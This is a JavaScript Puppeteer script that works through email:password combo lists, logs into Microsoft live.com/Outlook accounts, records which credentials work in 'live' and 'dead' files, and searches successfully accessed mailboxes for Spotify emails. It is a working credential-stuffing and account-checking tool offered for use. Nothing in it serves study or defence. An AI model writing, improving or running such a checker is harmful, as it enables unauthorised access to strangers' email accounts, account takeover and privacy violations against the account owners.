const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const path = require("path");
const readline = require("readline");
const chalk = require("chalk");

const LOGIN_URL = "https://login.live.com/login.srf?..."; // Your login URL
const MAILBOX_URL = "https://outlook.live.com/owa/..."; // Your mailbox URL

const stats = { total: 0, checked: 0, live: 0, dead: 0 };

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function ensureFolderExists(folderPath) {
    try {
        await fs.access(folderPath);
    } catch {
        await fs.mkdir(folderPath, { recursive: true });
    }
}

async function readFilters(filePath) {
    try {
        const data = await fs.readFile(filePath, "utf8");
        return data.trim().split("\n").filter(Boolean);
    } catch {
        return null;
    }
}

async function askToProceedWithoutFilters() {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => {
        rl.question("No filters found. Proceed without filtering? (y/n): ", answer => {
            rl.close();
            resolve(answer.toLowerCase() === "y");
        });
    });
}

async function waitForNavigation(page, options = {}) {
    try {
        await Promise.race([
            page.waitForNavigation({ waitUntil: "networkidle0", timeout: 3000, ...options }),
            new Promise(resolve => setTimeout(resolve, 3000))
        ]);
    } catch (error) {
        console.log(chalk.yellow("Navigation timeout or error occurred. Continuing..."));
    }
}

async function checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter) {
    let browser;
    try {
        browser = await puppeteer.launch({ headless: false });
        const page = await browser.newPage();
        await page.setDefaultNavigationTimeout(5000);

        console.log(chalk.blue(`Attempting login for: ${email}`));

        await page.goto(LOGIN_URL, { waitUntil: "networkidle0" });
        await page.type("#i0116", email);
        await Promise.all([
            page.click("#idSIButton9"),
            waitForNavigation(page)
        ]);

        try {
            await page.waitForSelector("#i0116Error", { timeout: 1000 });
            const errorMsg = await page.$eval(
                EMAIL_ERROR_SELECTOR,
                (el) => el.textContent
            );
            console.log(chalk.red(`❌ Email error: ${errorMsg}`));
            deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
            return;
        } catch (e) {
            // No email error, proceed
        }

        const passwordSelector = "#i0118";
        try {
            await page.waitForSelector(passwordSelector, { timeout: 1000 });
        } catch {
            console.log(chalk.red(`Password field not found for ${email}`));
            deadWriter.write(`${email}:${password} | Error: Password field not found\n`);
            return;
        }

        await page.type(passwordSelector, password);
        await Promise.all([
            page.click("#idSIButton9"),
            waitForNavigation(page)
        ]);


        const PASSWORD_ERROR_SELECTOR = "#i0118Error";
        try {
            await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 1000 });
            const errorMsg = await page.$eval(
                PASSWORD_ERROR_SELECTOR,
                (el) => el.textContent
            );
            console.log(chalk.red(`❌ Password error: ${errorMsg}`));
            deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
            return;
        } catch (e) {
            // No password error, proceed
        }

        const currentUrl = page.url();
        console.log(currentUrl)
        if (currentUrl.includes("/signin") || currentUrl.includes("recover?") || currentUrl.includes("Abuse?") || currentUrl.includes("cancel?")) {
            console.log(chalk.red(`Login failed for ${email}`));
            deadWriter.write(`${email}:${password} | Error: Login failed\n`);
            return;
        }

        // Handle "Stay signed in?" prompt if it appears
        try {
            await page.waitForSelector('#acceptButton', { timeout: 3000 });
            await Promise.all([
                page.click('#acceptButton'),
                waitForNavigation(page)
            ]);
        } catch {
        }

        console.log(chalk.green(`Login successful for ${email}`));

        // Perform email search and filtering here if needed
        await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });

        const searchboxselector = '#topSearchInput';
        try {
            await page.waitForSelector(searchboxselector, { timeout: 3000 });
            await Promise.all([
                page.type(searchboxselector, 'from:"no-reply@spotify.com"'),
                page.click('button[aria-label="Search"]', { timeout: 2000 }),
                waitForNavigation(page)
            ]);
        } catch {
        }

        try {
            await page.waitForSelector('.jGG6V.gDC9O', { timeout: 5000 });
            const results = await page.$$eval('.jGG6V.gDC9O', elements => elements.length);
            console.log(`Found ${results} result(s).`);
        } catch (e) {
            console.log('No search results found or search timed out.');
        }


        stats.live++;
        liveWriter.write(`${email}:${password}\n`);

    } catch (error) {
        console.error(chalk.red(`Error for ${email}:`, error.message));
        deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
        stats.dead++;
    } finally {
        if (browser) await browser.close();
        stats.checked++;
    }
}

async function processFile(inputFile, filters) {
    const outputFolder = path.join(process.cwd(), "output");
    await ensureFolderExists(outputFolder);

    const baseName = path.basename(inputFile, ".txt");
    const liveFile = path.join(outputFolder, `${baseName}_live.txt`);
    const deadFile = path.join(outputFolder, `${baseName}_dead.txt`);

    const liveWriter = await fs.open(liveFile, "a");
    const deadWriter = await fs.open(deadFile, "a");

    const data = await fs.readFile(inputFile, "utf8");
    const lines = data.trim().split("\n");
    stats.total += lines.length;

    for (let line of lines) {
        const [email, password] = line.split(":");
        await checkEmailWithPuppeteer(email.trim(), password.trim(), filters, liveWriter, deadWriter);
        await sleep(1000); // Add delay between requests
    }

    await liveWriter.close();
    await deadWriter.close();
}

async function main() {
    const filters = await readFilters(path.join(__dirname, "filter.txt"));

    if (!filters && !(await askToProceedWithoutFilters())) {
        console.log(chalk.red("Process aborted due to missing or empty filter.txt."));
        return;
    }

    const inputFolder = path.join(process.cwd(), "input");
    const inputFiles = await fs.readdir(inputFolder);
    const txtFiles = inputFiles.filter(file => file.endsWith(".txt"));

    if (txtFiles.length === 0) {
        console.error(chalk.red("No .txt files found in the input folder."));
        process.exit(1);
    }

    for (const inputFile of txtFiles) {
        await processFile(path.join(inputFolder, inputFile), filters);
    }

    console.log(chalk.blue("\nAuthentication process completed."));
    console.log(chalk.cyan(`Total: ${stats.total}, Checked: ${stats.checked}, Live: ${stats.live}, Dead: ${stats.dead}`));
}

main().catch(console.error);